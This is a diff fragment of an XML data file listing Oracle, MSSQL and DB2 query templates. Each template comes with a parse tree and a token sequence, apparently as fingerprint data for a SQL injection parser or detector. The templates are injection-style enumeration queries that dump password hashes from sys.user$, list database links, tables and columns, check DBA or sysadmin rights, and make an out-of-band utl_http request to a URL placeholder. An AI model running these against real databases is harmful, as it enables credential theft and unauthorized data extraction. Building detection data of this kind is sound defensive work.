+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 80, 49, 80, 237, 122, 237, 48, 237, 121, 237, 80, 237, 83, 237, 80, 49, 237, 80, 49, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}@{@DBLINK@}) where r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS table_name)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT UTL_INADDR.get_host_name FROM dual@{@DBLINK@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (get_host_name UTL_INADDR)))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT UTL_INADDR.get_host_address FROM dual@{@DBLINK@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (get_host_address UTL_INADDR)))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT user FROM dual
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT owner FROM (select owner, rownum as r from (SELECT distinct owner FROM all_tables)) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tables)))))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 48, 121, 237, 81, 237, 80, 237, 122, 237, 80, 50, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT banner FROM v$version WHERE banner LIKE 'Oracle%%'
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION banner))) (FROM (ALIAS v$version)) (WHERE (LIKE (STRING_LITERAL 'Oracle%%') (COLUMN_EXPRESSION banner)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT banner FROM v$version WHERE banner LIKE 'TNS%%'
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION banner))) (FROM (ALIAS v$version)) (WHERE (LIKE (STRING_LITERAL 'TNS%%') (COLUMN_EXPRESSION banner)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT version FROM v$instance
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION version))) (FROM (ALIAS v$instance))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT sys_context('USERENV', 'ISDBA') FROM dual
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION sys_context (STRING_LITERAL 'USERENV') (STRING_LITERAL 'ISDBA')))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 91, 49, 237, 91, 50, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT name, password, astatus FROM sys.user$
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION name)) (ALIAS (COLUMN_EXPRESSION password)) (ALIAS (COLUMN_EXPRESSION astatus))) (FROM (ALIAS (user$ sys)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 49, 237, 80, 237, 122, 237, 80, 40, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT name,spare4 FROM sys.user$
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION name)) (ALIAS (COLUMN_EXPRESSION spare4))) (FROM (ALIAS (user$ sys)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 80, 237, 122, 237, 80, 40, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT SYS.DATABASE_NAME FROM DUAL
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (DATABASE_NAME SYS)))) (FROM (ALIAS DUAL))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select utl_http.request('{@URL@}') from dual
+        </query>
+        <parsed/>
+        <tokens>
+            40, 80, 48, 91, 50, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select table_name from (SELECT table_name, rownum as r FROM all_tables) where r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tables)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS all_tab_columns)) (where (= (STRING_LITERAL '{@USER_NAME@}') (COLUMN_EXPRESSION owner))))))))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 48, 121, 237, 81, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 50, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (|| (|| (COLUMN_EXPRESSION USERNAME) (STRING_LITERAL ':')) (COLUMN_EXPRESSION DB_LINK)))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION DB_LINK)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS ALL_DB_LINKS)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 77, 237, 91, 237, 77, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select table_name from (SELECT table_name, rownum as r FROM user_tables) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS user_tables)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS user_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 80, 237, 122, 237, 48, 237, 121, 237, 80, 237, 83, 237, 80, 49, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 80, 49, 80, 237, 122, 237, 48, 237, 121, 237, 80, 237, 83, 237, 80, 49, 237, 80, 49, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}) where r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS table_name)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT UTL_INADDR.get_host_name FROM dual
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (get_host_name UTL_INADDR)))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle
+        </database>
+        <query>
+            SELECT UTL_INADDR.get_host_address FROM dual
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (get_host_address UTL_INADDR)))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select user
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user)))))
+        </parsed>
+        <tokens>
+            121, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            SELECT TOP 1 name FROM master..syslogins where name not in (SELECT TOP {@ROW@} name FROM master..syslogins ORDER BY name DESC) ORDER BY name DESC
+        </query>
+        <parsed/>
+        <tokens>
+            40, 40, 80, 237, 123, 237, 80, 237, 43, 237, 47, 237, 48, 121, 237, 80, 237, 89, 237, 80, 237, 122, 237, 80, 40, 40, 80, 237, 114, 237, 42, 237, 80, 237, 113, 50, 237, 114, 237, 42, 237, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select @@version
+        </query>
+        <parsed/>
+        <tokens>
+            98, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            SELECT DB_NAME()
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION DB_NAME)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            SELECT DB_NAME({@ROW@})
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION DB_NAME (INTEGER_LITERAL 1))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select top 1 name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') and name not in (select top {@ROW@} name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') order by name desc) order by name desc
+        </query>
+        <parsed/>
+        <tokens>
+            50, 237, 45, 237, 80, 237, 43, 237, 47, 237, 48, 121, 237, 80, 237, 89, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 47, 237, 48, 121, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 50, 237, 114, 237, 42, 237, 80, 237, 113, 50, 237, 114, 237, 42, 237, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select top 1 name from {@DATABASE@}..sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM {@DATABASE@}..sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC
+        </query>
+        <parsed/>
+        <tokens>
+            40, 40, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 45, 237, 80, 237, 43, 237, 47, 237, 48, 121, 237, 80, 237, 89, 237, 80, 237, 122, 237, 80, 40, 40, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 114, 237, 42, 237, 80, 237, 113, 50, 237, 114, 237, 42, 237, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select top 1 name from sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC
+        </query>
+        <parsed/>
+        <tokens>
+            50, 237, 114, 237, 42, 237, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            SELECT top 1 sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' and sysobjects.name not in (SELECT top {@row@} sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' order by sysobjects.name desc) order by sysobjects.name desc
+        </query>
+        <parsed/>
+        <tokens>
+            40, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 131, 237, 80, 237, 132, 237, 80, 40, 80, 51, 80, 40, 80, 237, 123, 237, 80, 40, 80, 51, 91, 237, 45, 237, 80, 40, 80, 237, 60, 237, 91, 237, 45, 237, 80, 40, 80, 237, 43, 237, 47, 237, 48, 121, 237, 80, 237, 89, 237, 80, 40, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 131, 237, 80, 237, 132, 237, 80, 40, 80, 51, 80, 40, 80, 237, 123, 237, 80, 40, 80, 51, 91, 237, 45, 237, 80, 40, 80, 237, 60, 237, 91, 237, 114, 237, 42, 237, 80, 40, 80, 237, 113, 50, 237, 114, 237, 42, 237, 80, 40, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            select top 1 cast({@COLUMN_NAME@} as varchar) from {@table_name@} where {@column_name@} not in (SELECT TOP {@row@} {@COLUMN_NAME@} FROM {@TABLE_NAME@} order by {@COLUMN_NAME@} desc) ORDER BY {@COLUMN_NAME@} DESC
+        </query>
+        <parsed/>
+        <tokens>
+            48, 80, 237, 83, 237, 80, 50, 237, 122, 237, 80, 237, 123, 237, 98, 80, 98, 237, 43, 237, 47, 237, 48, 121, 237, 80, 237, 89, 237, 80, 237, 122, 237, 80, 237, 114, 237, 42, 237, 80, 237, 113, 50, 237, 114, 237, 42, 237, 80, 237, 113
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mssql
+        </database>
+        <query>
+            (cast(is_srvrolemember('sysadmin') as varchar))
+        </query>
+        <parsed/>
+        <tokens>
+            48, 82, 48, 80, 48, 91, 50, 237, 83, 237, 80, 50, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            db2
+        </database>
+        <query>
+            select user from sysibm.sysdummy1
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user))) (from (ALIAS (sysdummy1 sysibm)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            db2
+        </database>
+        <query>
+            select versionnumber, version_timestamp from sysibm.sysversions
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION versionnumber)) (ALIAS (COLUMN_EXPRESSION version_timestamp))) (from (ALIAS (sysversions sysibm)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 237, 122, 237, 80, 40, 80
+        </tokens>
+    </query>
+</queries>
